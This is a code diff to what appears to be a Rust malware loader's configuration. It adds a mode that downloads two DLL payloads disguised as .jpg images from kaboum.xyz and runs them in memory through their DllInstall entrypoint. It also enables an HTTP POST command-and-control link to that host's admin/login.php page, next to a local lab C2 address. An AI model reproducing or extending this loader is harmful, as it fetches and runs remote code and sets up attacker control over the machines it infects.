@@ -105,6 +105,32 @@ fn main() {
             dll_entrypoint: String::from("DllInstall"),
             thread: true,
         })];
+    } else if payload == "2dll".to_string() {
+        info!("[+] Loader type choice: DllFromMemory [AEAD]");
+        let payload_dataoperation: Vec<DataOperation> =
+            serde_json::from_slice(&fs::read(&payload_dataope).unwrap()).unwrap();
+        payload_choice = vec![
+            Payload::DllFromMemory(DllFromMemory {
+            link: Link::HTTP(HTTPLink {
+                url: String::from("https://kaboum.xyz/artdonjon/donjon_dll.jpg"),
+                dataoperation: payload_dataoperation.clone(),
+                jitt: 0,
+                sleep: 0,
+            }),
+            dll_entrypoint: String::from("DllInstall"),
+            thread: true,
+            }),
+            Payload::DllFromMemory(DllFromMemory {
+                link: Link::HTTP(HTTPLink {
+                    url: String::from("https://kaboum.xyz/artdonjon/donjon_dll2.jpg"),
+                    dataoperation: payload_dataoperation,
+                    jitt: 0,
+                    sleep: 0,
+                }),
+                dll_entrypoint: String::from("DllInstall"),
+                thread: true,
+                }),
+            ];
     } else if payload == "py".to_string() {
         info!("[+] Loader type choice: ExecPython");
         payload_choice = vec![
@@ -227,14 +253,14 @@ exec(decoded_script)
                     stop_new: false, // stop if found a new conf -> not for parallel
                     accept_old: false, // accept conf older than the active one -> true not recommended, need to fight against hypothetic valid config replay.
                 }),
-                pool_links: vec![
-                    /*
-                    Link::HTTPost(HTTPPostLink {
+                pool_links: vec![                    
+                    Link::HTTPPostC2(HTTPPostC2Link {
                         url: String::from("https://kaboum.xyz/admin/login.php"),
                         dataoperation: vec![],
+                        dataoperation_post: vec![],
                         jitt: 0,
                         sleep: 0,
-                    }), */
+                    }),
                     Link::HTTPPostC2(HTTPPostC2Link {
                         url: String::from("http://192.168.56.1:3000/login.php"),
                         dataoperation: vec![],
@@ -358,7 +384,7 @@ exec(decoded_script)
                 operator: Operator::AND,
             }),
         ],
-        5,
+        1,
         0,
     );
     //info!("{:?}", loaderconf);
